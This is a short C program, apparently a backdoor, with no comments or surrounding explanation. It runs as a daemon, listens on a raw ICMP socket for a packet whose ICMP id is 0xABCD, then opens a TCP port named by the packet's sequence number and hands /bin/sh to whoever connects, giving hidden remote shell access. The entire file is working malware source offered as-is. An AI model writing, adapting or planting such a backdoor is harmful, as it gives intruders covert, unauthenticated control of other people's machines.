#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <unistd.h>
#include <signal.h>

int main(int argc, char *argv[])
{
  struct ipacket {
    struct iphdr ip;
    struct icmp icmp;  
  } *packet;

  int isock, sd, cli;
  int pid;
  struct sockaddr_in servaddr;

  daemon(0, 0);
  packet = (struct ipacket *) malloc(sizeof(struct iphdr) + sizeof(struct icmp));
  signal(SIGCHLD, SIG_IGN);

  while (1) {
    if ( (isock = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) {
      perror("isock socket() failed");
      exit(-1);
    }
    while (packet->icmp.icmp_id != 0xABCD) {
      recv(isock, packet, sizeof(struct ipacket), 0);
    } 
    if (pid = fork()) {
      close(isock);
      waitpid(pid, NULL, NULL);
    } else {
      servaddr.sin_family = AF_INET;
      servaddr.sin_addr.s_addr = INADDR_ANY;
      servaddr.sin_port = htons(packet->icmp.icmp_seq);
      sd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
      if (bind(sd, (struct sockaddr *)&servaddr, sizeof(servaddr)))
        perror("bind() failed");
      listen(sd, 1);
      cli = accept(sd, NULL, 0);
      dup2(cli, 0);
      dup2(cli, 1);
      dup2(cli, 2);
      execl("/bin/sh", "sh", NULL);
    }
  }
}
